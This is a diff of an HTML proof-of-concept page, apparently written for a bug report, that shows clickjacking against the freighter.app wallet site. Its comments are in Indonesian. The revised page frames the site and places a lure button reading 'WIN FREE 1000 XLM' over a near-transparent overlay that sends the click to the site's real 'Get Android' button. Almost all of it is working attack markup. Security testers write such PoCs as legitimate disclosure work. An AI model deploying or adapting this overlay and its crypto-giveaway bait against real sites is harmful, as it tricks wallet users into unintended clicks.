@@ -3,38 +3,37 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
-<title>Clickjacking PoC - freighter.app - 0x403for</title>
+<title>Clickjacking Get Android - freighter.app</title>
 <style>
 body{margin:0;font-family:monospace;background:#000;color:#fff;padding:10px}
-#container{position:relative;width:100%;height:800px;border:2px solid #333;overflow:hidden;background:#fff}
-#victim{position:absolute;top:0;left:0;width:100%;height:100%;border:none;opacity:1;z-index:1}
-#overlay{position:absolute;top:0;left:0;width:100%;height:100%;z-index:10;pointer-events:none;background:rgba(255,0,102,0.15);border:2px dashed #ff0066}
-#label{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);z-index:11;background:#ff0066;padding:15px 25px;border-radius:10px;font-size:14px;pointer-events:none;color:#fff;font-weight:bold;text-align:center;box-shadow:0 0 20px #ff0066}
-#log{background:#111;border:1px solid #0f0;padding:10px;margin-top:10px;font-size:11px;height:110px;overflow-y:auto;color:#0f0}
+#container{position:relative;width:100%;height:850px;border:2px solid #ff0066;overflow:hidden;background:#000}
+#victim{position:absolute;top:0;left:0;width:100%;height:100%;border:none;z-index:1}
+#fakeBtn{position:absolute;top:440px;left:62%;transform:translateX(-50%);width:210px;height:78px;z-index:5;background:#00ff88;color:#000;border:none;border-radius:50px;font-weight:bold;font-size:16px;cursor:pointer;box-shadow:0 0 20px #00ff88}
+#invisible{position:absolute;top:440px;left:62%;transform:translateX(-50%);width:210px;height:78px;z-index:10;opacity:0.01;background:red;cursor:pointer;border:none}
+#label{position:absolute;top:380px;left:50%;transform:translateX(-50%);z-index:11;background:#ff0066;color:#fff;padding:10px 20px;border-radius:8px;font-size:12px;pointer-events:none;text-align:center}
+#log{background:#111;border:1px solid #0f0;padding:10px;margin-top:10px;font-size:11px;height:100px;overflow-y:auto;color:#0f0}
 </style>
 </head>
 <body>
-<h3>Clickjacking PoC - freighter.app - 0x403for.github.io</h3>
-<p>Child: https://freighter.app/ framed without X-Frame-Options</p>
-<p style="color:yellow">PoC: freighter.app bisa di-iframe. Klik tombol Download di dalam iframe akan ter-trigger dari parent attacker.</p>
+<h3>Clickjacking PoC - Get Android - freighter.app</h3>
+<p>Parent: 0x403for.github.io | Child: freighter.app (NO X-Frame-Options)</p>
 
 <div id="container">
-  <iframe id="victim" src="https://freighter.app/" onload="log('VULNERABLE: freighter.app LOADED in iframe - NO X-Frame-Options / CSP frame-ancestors')"></iframe>
-  <div id="overlay"></div>
-  <div id="label">ATTACKER PAGE<br/>⬇️ KLIK TOMBOL Download DI BAWAH INI ⬇️<br/>(Klik akan tembus ke freighter.app)</div>
+  <iframe id="victim" src="https://freighter.app/" onload="log('VULNERABLE: freighter.app loaded')"></iframe>
+  <button id="fakeBtn">🎁 WIN FREE 1000 XLM - CLICK!</button>
+  <button id="invisible" onclick="attack()"></button>
+  <div id="label">⬇️ INVISIBLE OVERLAY DI SINI ⬇️<br/>Pas di atas Get Android hitam asli</div>
 </div>
 
-<div id="log">[00:00:00] Loading freighter.app...</div>
+<div id="log">[00:00] Ready. Get Android ada di belakang overlay merah transparan.<br/></div>
 
 <script>
 const logEl=document.getElementById('log');
-function log(m){const d=document.createElement('div');d.textContent=`[${new Date().toLocaleTimeString()}] ${m}`;logEl.appendChild(d)}
-document.getElementById('victim').addEventListener('load',()=>{
-  setTimeout(()=>{
-    log('Jika konten freighter.app terlihat (gradient ungu) = VULNERABLE');
-    log('Coba klik tombol Get iOS / Download - jika ter-redirect = Clickjacking proven');
-  },1000);
-});
+function log(m){logEl.innerHTML+=`<div>[${new Date().toLocaleTimeString()}] ${m}</div>`}
+function attack(){
+  log('INVISIBLE CLICKED! Kalau Play Store kebuka = CLICKJACKING PROVEN');
+  alert('Overlay clicked! Play Store kebuka? Kalau YA = BUG!');
+}
 </script>
 </body>
 </html>
